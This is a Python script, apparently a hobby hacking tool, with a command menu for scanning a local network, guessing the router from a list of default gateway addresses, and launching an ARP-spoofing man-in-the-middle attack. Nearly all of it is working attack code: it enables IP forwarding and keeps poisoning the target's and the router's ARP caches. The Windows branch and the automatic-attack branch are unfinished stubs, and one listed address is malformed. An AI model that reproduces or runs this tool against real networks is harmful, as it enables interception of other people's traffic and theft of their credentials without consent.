#!/usr/bin/env python

import scapy.all as scapy  # handle tasks like scanning and network discovery
import subprocess  # function for shell commands
import re  # regular expressions
import time  # use sleep() for delays
import sys  # info about the os


# function that update the router_default with the new IPs
def update_routers(defaults):
    try:
        print('[+] Reading file: newIPs...')
        time.sleep(0.1)
        with open('/root/PycharmProjects/TheBoss/newIPs', 'r') as newIPsFile:
            print("[+] Updating router's IP list...")
            time.sleep(0.1)
            update_ips = [ip.strip('\n\r') for ip in newIPsFile.readlines()]
            defaults.update(update_ips)
            print("[+] Done updating. Closing file...")
            time.sleep(0.1)
        newIPsFile.close()
        print("[+] File closed.")
        time.sleep(0.1)
        return defaults
    except FileNotFoundError:
        print("[!] newIPs file doesn't exist")
        return defaults


# function that returns a list with responses from a broadcast
def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = brdcast / arp_request  # Combine into a single packet

    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    return scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]


# function that scans network IPs
def network_scanner():
    if SYS_PLATFORM == "linux":
        print('[+] Capturing IPv4 Address...')
        time.sleep(0.1)
        eth0_result = subprocess.run(["ip", "a", "show", "eth0"], capture_output=True, text=True).stdout
        ipv4_search_result = re.search(r"\b(\d+\.){3}\d+/\d+\b", eth0_result)
        if ipv4_search_result:
            try:
                # in order to scan, the default IP needs format 'x.x.x.0/x'
                dot_index = (len(ipv4_search_result.group(0)) - 1) - ipv4_search_result.group(0)[::-1].index('.')
                slash_index = ipv4_search_result.group(0).index('/')
                scan_ip = ipv4_search_result.group(0)[:dot_index + 1] + '0' + ipv4_search_result.group(0)[slash_index:]
                print('[+] Scanning Network...')
                time.sleep(0.1)
                return [ip[1].psrc for ip in broadcast(scan_ip)]  # returns the list with the IPs
            except ValueError:
                print("[!] '.' or '/' not found in IPv4 string")
                return
        else:
            print("[-] Could not read IPv4 Address.")
            return
    elif SYS_PLATFORM == "win32":  # TODO //////////////////////////////////
        example = 128
        if example == 0:
            num_of_zeros = 8
        else:
            binary_form = bin(example)[2:]
            num_of_zeros = len(binary_form) - len(binary_form.rstrip('0'))
    else:
        return


# function that searches the scanned list for router's IP
def search_router_ip(scan_list, routers):
    print('[+] Searching for router IP...')
    time.sleep(0.1)
    for curr_ip in scan_list:
        if curr_ip in routers:
            print('[+] Router IP found: {}'.format(curr_ip))
            time.sleep(0.1)
            router = curr_ip
            scan_list.remove(curr_ip)
            return router
    print('[-] Search failed! Returning whole list of IPs.')
    return


# function that returns target, source IPs from input
def manual_ip_input(scan_list):
    print("IP Table")
    print("--------")
    for ip in scan_list:
        print(ip)
    print("--------")
    trgt = input('Your target IP: ')
    src = input('Your source IP: ')
    return trgt, src


# function that returns MAC address of selected IP
def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        print("[!] No response..")


# function that creates a man in the middle
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2: send packet as response, not request
    # pdst: destination target IP address
    # hwdst: destination target MAC address
    # psrc: source IP address, here equal to router
    # hwsrc: source MAC address
    # Target sees attacker's MAC address but thinks it's the router cause of the IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)  # count: number of times to send


class ArpSpoof:
    def __init__(self, trg, src):
        print("[+] Initializing Man-In-The-Middle...")
        self.source = src
        self.target = trg

    def run(self):
        sent_packets_count = 0
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")  # enable ip forwarding to allow flow of packets through machine
            while True:
                spoof(self.target, self.source)
                spoof(self.source, self.target)
                sent_packets_count += 2
                print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
                time.sleep(2)  # 2 seconds delay
        except KeyboardInterrupt:
            print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
            restore(self.target, self.source)
            restore(self.source, self.target)
            print("[+] Done!")
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")  # disable ip forwarding


SYS_PLATFORM = sys.platform  # os of the current machine
command = ''
scan_result = []
# ------------------------------POSSIBLE ROUTER IP------------------------------
router_ip = ''
# a set containing all the default router gateways
router_default = {'10.90.90.90', '192.168.0.50', '10.1.1.1', '192.168.0.3', '192.168.0.1', '192.168.1.99',
                  '192.168.10.50', '192.168.254.254', '192.168.0.10', '192.168.123.254', '10.0.0.138', '10.0.0.2',
                  '192.168.3.1', '192.168.2.1', '192.168.100.100', '192.168.223.100', '192.168.0.227', '192.168.1.254',
                  '192.168.0.254', '192.168.100.1', '192.168.11.1', '192.168.0.101', '10.0.1.1', '192.168.30.1',
                  '192.168.2.254', '192.168.102.1', '192.168.55.1', '10.10.1.1', '192.168.1.200', '192.168.168.168',
                  '192.168.251.1', '192.168.10.100', '192.168.16.1', '192.168.15.1', '192.168.86.1', '192.168.10.10',
                  '192.168.1.10.1', '10.1.10.1', '192.168.20.1', '192.168.1.1', '192.168.50.1', '192.168.0.100',
                  '192.168.1.10', '192.168.1.20', '192.168.1.210', '192.168.10.1', '192.168.62.1', '200.200.200.5',
                  '192.168.4.1', '10.0.0.1', '192.168.1.100', '192.168.8.1', '192.168.0.30'}
router_default = update_routers(router_default)
# ------------------------------------------------------------------------------

# --------------------------------MENU INTERFACE--------------------------------
while True:
    print("Insert your command:")
    command = input(">> ")
    try:
        if command == "exit()":
            print("[+] Cya later Boss!")
            time.sleep(0.1)
            sys.exit()

        elif command == "scan()":
            scan_result = network_scanner()
            if scan_result:
                router_ip = search_router_ip(scan_result, router_default)
            else:
                print('[-] Network scan failed.')

        elif command == "arpspoof()":
            if scan_result:
                if router_ip:  # TODO ///////////////////////
                    print("[+] Router IP found...")
                    time.sleep(0.1)
                    print("[+] Start auto MITM")
                    time.sleep(0.1)
                else:
                    print("[-] Router IP not found. Choose manually..")
                    time.sleep(0.1)
                    target, source = manual_ip_input(scan_result)
                    while target not in scan_result or source not in scan_result:
                        print("[-] IPs not found in list. Try again")
                        time.sleep(0.1)
                        target, source = manual_ip_input(scan_result)
                    arp_spoofing = ArpSpoof(target, source)
                    arp_spoofing.run()
            else:
                print("[-] Network IPs not defined. Please scan() first.")
                time.sleep(0.1)

        elif command == "update()":
            router_default = update_routers(router_default)

        elif command == "help()":
            print("----------------------------------")
            print("COMMANDS      DESCRIPTION")
            print("----------------------------------")
            print("scan()        Network scanning")
            print("arpspoof()    MITM Attack")
            print("exit()        Exit the app")
            print("----------------------------------")

        else:
            print('[-] Command not found. Type help() to show commands.')

    except Exception:
        print('[-] Error during command execution.')
# ------------------------------------------------------------------------------
